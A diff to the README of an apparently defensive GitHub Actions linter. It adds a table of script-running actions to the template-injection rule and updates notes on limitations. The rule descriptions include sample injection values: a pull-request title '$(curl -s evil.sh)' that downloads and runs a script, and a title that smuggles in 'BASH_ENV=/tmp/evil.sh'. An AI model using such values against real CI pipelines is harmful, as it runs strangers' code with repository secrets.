@@ -25,12 +25,36 @@ deliberately small and readable: one file per concern, every rule explained belo
 | WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
 | WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
 | WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
-| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action or a reusable workflow (`on: workflow_call`), `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. When the caller (a job or a step) is one of the checked files, what it really passes in `with:` decides instead (high for a PR title, nothing for clean values; see below). Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
+| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:`, `actions/github-script` or the script input of an action that runs one (see [Actions that run a script](#actions-that-run-a-script)). The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action or a reusable workflow (`on: workflow_call`), `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. When the caller (a job or a step) is one of the checked files, what it really passes in `with:` decides instead (high for a PR title, nothing for clean values; see below). Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
 | WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`, or a `refs/pull/...` ref) then runs a stranger's code with those secrets. |
 | WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
 | WG007 | untrusted-github-env | high (medium for inputs from unknown callers) | Untrusted text appended to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:`, directly or through `env:`/shell variables (`echo "T=$TITLE" >> "$GITHUB_ENV"`). Every later step reads those files: a PR title with a line break such as `x` + newline + `BASH_ENV=/tmp/evil.sh` sets a variable that makes bash run the sender's script, and `$GITHUB_PATH` can put their directory first in `PATH`. No `${{ }}` in the script is needed for this, so WG004 alone doesn't catch it. Pass the value to the step that needs it via `env:` or a step output. |
 | WG008 | secrets-exposure | medium; high for `toJSON(secrets)` | `${{ secrets.X }}` pasted into `run:` or a github-script: the secret becomes part of the script text, quotes or `$` in it break the script, and `set -x`, an error message or a process listing can show it (GitHub's log masking only catches exact matches). Pass it through `env:` and use `"$X"`. Also `toJSON(secrets)` anywhere (every secret in one value) and `secrets: inherit` on a reusable workflow from another repository (all secrets handed to code that lives elsewhere). Passing a secret to an action's `with:` is fine. |
 | WG009 | workflow-run | high for a checkout of the triggering commit or artifacts unpacked into the workspace before a `run:` step; medium for other artifact downloads | A `workflow_run` workflow runs with secrets and a write token, but the run that triggered it may have built a fork's pull request. Checking out `github.event.workflow_run.head_sha` (or `head_branch`, `head_repository`, `pull_requests`) runs the fork's code with those secrets; so does doing it in a script (`git checkout`, `git fetch`, `git switch`, `git reset`, `git pull`, `git worktree add` of the head, also through an `env:` variable, or `gh pr checkout` of its pull request). Its artifacts (`actions/download-artifact` with `run-id:`, `dawidd6/action-download-artifact`, `gh run download`, `downloadArtifact` in a github-script) are the fork author's files: unpacked into the workspace they can replace the repository's scripts and config that later steps run. Download to `${{ runner.temp }}` and treat the contents as data. When every workflow named under `on.workflow_run.workflows` is among the checked files and none runs on `pull_request` (or another `workflow_run`), nothing is reported: those runs only build this repository's own commits. A `branches:` filter under `on.workflow_run` doesn't change that and is named in the message: it matches the head branch of the fork's pull request, whose name the fork picks (`main` too). |
+
+### Actions that run a script
+
+Some actions take a script as an input and run it: on the runner, in a container, or on a server
+over SSH. `${{ }}` there is pasted into the code just like in `run:`, so WG004 and WG008 check
+these inputs too (names without case, any version), and the message names the action:
+
+| Action | Inputs |
+|--------|--------|
+| `actions/github-script` | `script` |
+| `appleboy/ssh-action` | `script` |
+| `garygrossgarten/github-action-ssh`, `google-github-actions/ssh-compute` | `command` |
+| `addnab/docker-run-action` | `run` |
+| `uraimo/run-on-arch-action` | `run`, `install`, `setup` |
+| `nick-fields/retry` (and its old name `nick-invision/retry`) | `command`, `on_retry_command`, `new_command_on_retry` |
+| `Wandalen/wretry.action` | `command` |
+| `azure/cli`, `azure/powershell` | `inlineScript` |
+| `cypress-io/github-action` | `build`, `start`, `command`, `install-command` |
+| `mathiasvr/command-output` | `run` |
+| `jannekem/run-python-script-action` | `script` |
+
+For SSH and container actions the step's `env:` doesn't reach the script by itself; the message
+says how to pass a variable there (`envs:` for `appleboy/ssh-action`, `options: -e NAME` for
+`addnab/docker-run-action`, ...). The list lives in `src/workflow_guard/scripts.py`.
 
 ### Actions too
 
@@ -325,6 +349,7 @@ src/workflow_guard/
   calls.py     local reusable workflows and actions: what callers pass into each input
   project.py   the files checked together; which file a uses: ./... runs
   writes.py    what a script or github-script writes to $GITHUB_OUTPUT / ENV / PATH
+  scripts.py   where a step's script text is: run:, github-script, actions that run an input
   fix.py       --fix: GitHubResolver (API lookups), pin_actions (text edits), comment style
   sarif.py     --format sarif: rules, results, fingerprints, notifications
   annotations.py --format github: workflow commands, with GitHub's escaping
@@ -398,7 +423,8 @@ CHANGELOG.md.
 - The action needs `bash` (all GitHub-hosted runners have it, Windows included) and network
   access to PyPI for PyYAML.
 - Not on PyPI or the GitHub Marketplace yet; install from the repository.
-- WG004 only looks at `run:` and `actions/github-script`; other actions can also misuse inputs.
+- WG004 looks at `run:`, `actions/github-script` and the actions listed under "Actions that run
+  a script". Other actions can also run an input as code; they aren't known.
 - WG009 looks for `actions/checkout`, git/gh commands in `run:` (one line at a time, with
   `\` continuations joined; the head reference must be on the same line as the command) and
   four common ways to download artifacts. Shell variables set inside the script (`SHA=...; git
